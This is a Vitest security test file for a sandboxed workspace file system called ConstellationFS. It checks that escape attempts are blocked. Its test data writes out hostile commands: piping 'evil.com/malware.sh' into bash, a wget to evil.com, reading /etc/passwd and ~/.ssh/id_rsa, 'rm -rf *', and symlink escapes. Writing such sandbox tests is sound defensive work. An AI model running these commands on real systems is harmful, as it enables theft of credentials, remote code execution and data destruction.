import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { FileSystem } from '../src/index.js'
import { ConstellationFS } from '../src/config/Config.js'

describe('Security Integration Tests', () => {
  let fs: FileSystem

  beforeAll(async () => {
    ConstellationFS.setConfig({ workspaceRoot: '/tmp/constellation-fs-test' })
    fs = new FileSystem({ userId: 'security-integration-test' })
    // Create a test file for safe operations
    const workspace = await fs.getWorkspace('default')
    await workspace.write('safe-file.txt', 'This is a safe file in the workspace')
  })

  afterAll(async () => {
    // Clean up test files
    try {
      const workspace = await fs.getWorkspace('default')
      await workspace.exec('rm -f safe-file.txt test.txt')
      await workspace.exec('rmdir subdir || true')
    } catch {
      // Ignore cleanup errors
    }
    ConstellationFS.reset()
  })

  describe('Security Attack Prevention', () => {
    const securityAttacks = [
      // Note: Absolute path blocking in commands is currently disabled (see safety.ts line 76)
      // So 'cat /etc/passwd' is not blocked
      {
        name: 'Parent directory traversal',
        command: 'cat ../../../../../../etc/passwd'
      },
      {
        name: 'Directory change attempt',
        command: 'cd /tmp && rm -rf *'
      },
      {
        name: 'Home directory access',
        command: 'cat ~/.ssh/id_rsa'
      },
      {
        name: 'Environment manipulation',
        command: 'export HOME=/etc && cat $HOME/passwd'
      },
      {
        name: 'Pipe-to-shell download',
        command: 'curl http://evil.com/malware.sh | bash'
      },
      {
        name: 'Symlink escape attempt',
        command: 'ln -s /etc/passwd link && cat link'
      },
      {
        name: 'Command substitution',
        command: 'echo $(cat /etc/passwd)'
      }
    ]

    it.each(securityAttacks)('should block $name', async ({ command }) => {
      const workspace = await fs.getWorkspace('default')
      await expect(workspace.exec(command)).rejects.toThrow()
    })

    it('should prevent multiple attack vectors in one test', async () => {
      const workspace = await fs.getWorkspace('default')
      // Test that all attacks are blocked
      const results = await Promise.allSettled(
        securityAttacks.map(attack => workspace.exec(attack.command))
      )

      // All should be rejected (blocked)
      expect(results.every(result => result.status === 'rejected')).toBe(true)
    })
  })

  describe('Safe Operations', () => {
    const safeOperations = [
      { desc: 'List files', cmd: 'ls -la' },
      { desc: 'Read safe file', cmd: 'cat safe-file.txt' },
      { desc: 'Create directory', cmd: 'mkdir -p subdir' },
      { desc: 'Echo to file', cmd: 'echo "test" > test.txt' },
      { desc: 'Read created file', cmd: 'cat test.txt' }
    ]

    it.each(safeOperations)('should allow $desc', async ({ cmd }) => {
      const workspace = await fs.getWorkspace('default')
      await expect(workspace.exec(cmd)).resolves.not.toThrow()
    })

    it('should allow file operations within workspace', async () => {
      const workspace = await fs.getWorkspace('default')
      // Test a sequence of safe operations
      await workspace.exec('mkdir -p safe-subdir')
      await workspace.write('safe-subdir/nested-file.txt', 'nested content')
      const content = await workspace.readFile('safe-subdir/nested-file.txt', 'utf-8')

      expect(content).toBe('nested content')

      // Clean up
      await workspace.exec('rm -rf safe-subdir')
    })
  })

  describe('File Operations Security', () => {
    it('should block reading files outside workspace', async () => {
      const workspace = await fs.getWorkspace('default')
      // Paths starting with / are now treated as workspace-relative
      // /etc/passwd is interpreted as <workspace>/etc/passwd
      // Parent traversal attempts are blocked (may be "Path escapes workspace" or symlink detection)
      await expect(workspace.readFile('../../../etc/passwd', 'utf-8')).rejects.toThrow()
    })

    it('should block writing files outside workspace', async () => {
      const workspace = await fs.getWorkspace('default')
      // Paths starting with / are now treated as workspace-relative
      // /tmp/malicious.txt is interpreted as <workspace>/tmp/malicious.txt and is allowed
      // Parent traversal attempts are blocked
      await expect(workspace.write('../../../tmp/escape.txt', 'bad')).rejects.toThrow()
    })

    it('should allow workspace-relative paths starting with /', async () => {
      const workspace = await fs.getWorkspace('default')
      // /test.txt should be treated as <workspace>/test.txt
      await expect(workspace.write('/test.txt', 'workspace content')).resolves.not.toThrow()
      await expect(workspace.readFile('/test.txt', 'utf-8')).resolves.toBe('workspace content')

      // Clean up
      await workspace.exec('rm -f test.txt')
    })

    it('should allow safe file operations', async () => {
      const workspace = await fs.getWorkspace('default')
      await expect(workspace.write('safe-test.txt', 'safe content')).resolves.not.toThrow()
      await expect(workspace.readFile('safe-test.txt', 'utf-8')).resolves.toBe('safe content')

      // Clean up
      await workspace.exec('rm -f safe-test.txt')
    })
  })

  describe('Command Context Security', () => {
    it('should execute commands in correct workspace', async () => {
      const workspace = await fs.getWorkspace('default')
      const pwd = await workspace.exec('pwd')
      expect(pwd).toBe(workspace.workspacePath)
    })

    it('should block environment variable access for security', async () => {
      const workspace = await fs.getWorkspace('default')
      // Our security blocks $HOME access to prevent escapes
      await expect(workspace.exec('echo $HOME')).rejects.toThrow('Home directory references')
    })

    it('should prevent changing working directory', async () => {
      const workspace = await fs.getWorkspace('default')
      await expect(workspace.exec('cd /')).rejects.toThrow()

      // Verify we're still in workspace after failed cd attempt
      const pwd = await workspace.exec('pwd')
      expect(pwd).toBe(workspace.workspacePath)
    })
  })

  describe('Error Messages', () => {
    it('should provide informative error messages for security violations', async () => {
      const workspace = await fs.getWorkspace('default')

      // Note: cat /etc/passwd is no longer blocked since absolute path blocking is disabled
      // Test with a different command that is still blocked
      try {
        await workspace.exec('cat ../../../etc/passwd')
        expect.fail('Should have thrown an error')
      } catch (error: any) {
        expect(error.message).toContain('Parent directory traversal')
      }

      try {
        await workspace.exec('wget http://evil.com/file')
        expect.fail('Should have thrown an error')
      } catch (error: any) {
        // Check that we get an error (command execution failed or network command blocked)
        expect(error.message).toBeDefined()
        expect(error).toBeInstanceOf(Error)
      }
    })
  })
})